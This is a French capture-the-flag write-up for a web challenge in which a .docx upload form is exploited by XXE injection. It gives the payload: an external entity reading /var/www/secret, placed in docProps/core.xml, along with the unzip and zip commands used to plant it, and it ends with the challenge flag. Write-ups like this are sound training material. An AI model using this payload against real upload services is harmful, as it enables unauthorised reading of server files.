* * * * *
					   La boite à secret - Web
* * * * *

**Enoncé:** Il semble que Djakpataglo ait un vrai problème avec les fichiers .docx [lien de l'épreuve](http://hackerlab.bj:8082/)

On ouvre le lien dans le naviguateur et on a un message: 
>L'OCRC a arrêté le célèbre GAYEMAN qui affirme après interrogatoire que le flag se trouve dans **/var/www/secret** 

Et un formulaire d'upload de fichier au format **.docx**. 
Après une série d'upload de shell échoués, nous avons su grâce à des recherches qu'il s'agissait de **l'xxe (XML External Entity) injection**.

Le principe est simple, nous allons injecter du code **XML** dans un document Word (**.docx**),  nous permettant de lire le flag contenu dans le fichier **/var/www/secret** .

Le code à injecter:

```xml
<!DOCTYPE replace [ <!ENTITY ent SYSTEM "file:///var/www/secret" > ]\>
<dc:title>&ent;</dc:title>
```

Pour injecter ce code, nous allons créer un simple document **Word** et écrire n'importe quoi dedans puis l'enregistrer. Ensuite nous allons l'extraire avec **unzip**:

`$ unzip payload.docx`

	Archive: payload.docx 
		 inflating: *rels/.rels
		 inflating: word/*rels/document.xml.rels
		 inflating: word/fontTable.xml
		 inflating: word/styles.xml
		 inflating: word/document.xml
		 inflating: word/settings.xml
		 inflating: docProps/core.xml
		 inflating: docProps/app.xml
		 inflating: [Content\_Types].xml

Une fois extrait, allons dans le dossier puis injectons notre charge utile **(payload XML)** dans le fichier **docProps/core.xml**

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?> 
	<!DOCTYPE replace [ <!ENTITY ent SYSTEM "file:///var/www/secret" > ]\> <!-- PAYLOAD 1-->
	<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
		<dcterms:created xsi:type="dcterms:W3CDTF">2019-11-21T18:21:30Z</dcterms:created>
		<dc:creator></dc:creator>
		<dc:description></dc:description>
		<dc:language>fr-FR</dc:language>
		<cp:lastModifiedBy></cp:lastModifiedBy>
		<cp:revision>0</cp:revision>
		<dc:subject></dc:subject>
		<dc:title>&ent;</dc:title> <!-- PAYLOAD 2-->
	</cp:coreProperties>
```

Après ça nous allons mettre à jour le fichier sous le même nom c'est à dire **payload.docx** et ensuite l'uploader:

`$ zip -u payload.docx docProps/core.xml`

Après l'upload, on a le flag:

**Your flag is 'CTF_YeahWebExploiter! '**


